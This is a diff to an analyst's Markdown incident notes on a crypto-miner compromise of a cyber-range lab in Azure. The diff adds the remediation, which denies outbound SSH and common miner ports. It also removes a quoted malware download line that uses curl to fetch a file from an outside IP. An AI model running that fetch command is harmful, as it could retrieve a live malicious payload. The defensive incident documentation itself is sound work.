@@ -888,13 +888,12 @@ Miner
 
 ## Cloud Provider Disables Azure VNet
 
-**Cyber Range SOC was previously targeted by this malware**
+**Cyber Range SOC was previously targeted by this malware** in _May 2025_
 
 - Email recieved: **Notice of Microsoft Azure Subscription Termination** from the **Microsoft Azure Safeguard Team**
 - Case _SIR21183209_
 - even though malware was not deployed by us, it still originates from our environment and is therefore our responsibility
 - Microsoft temporarily **disabled Cyber Range VNet 2**
-- Cyber Range Engineer responds by closing off SSH ports
 
  <br>
 
@@ -909,6 +908,22 @@ Miner
  <Br>
 
 <img width="1957" height="1055" alt="image" src="https://github.com/user-attachments/assets/4c4f3dff-2186-42ee-8672-adaf360bdfff" />
+
+<br>
+
+**Cyber Range Engineer responds**
+- New outbound rules for _SSH_ and common crypto miner ports denied
+   - Ports 22, 3333, 4444, 5555, etc.
+- VMs can continue Root Labs without scanning outbound IPs, even if compromised
+- **Compromised VM successfully scanned subnet 10.1.0.0/24:22**
+
+  <br>
+
+  <img width="1394" height="642" alt="image" src="https://github.com/user-attachments/assets/81ab7bbc-837a-4572-9206-2061f6d63094" />
+
+<Br>
+
+<img width="1120" height="646" alt="image" src="https://github.com/user-attachments/assets/7cc46184-a833-44d7-b9be-7ccb5103f29b" />
 
 <br>
 
@@ -1006,12 +1021,4 @@ When a file is immutable:
 Until you remove the flag.
 It can delay remediation and leave the system reinfected.
 
-
-curl http://23.160.56.194/r.txt -o sdf3fslsdf15
-
-port 22 closed
-<img width="1394" height="642" alt="image" src="https://github.com/user-attachments/assets/81ab7bbc-837a-4572-9206-2061f6d63094" />
-
-nsg updates
-<img width="842" height="485" alt="image" src="https://github.com/user-attachments/assets/3dbf8dbf-cd98-4428-b32a-a6ff1cc65354" />
 
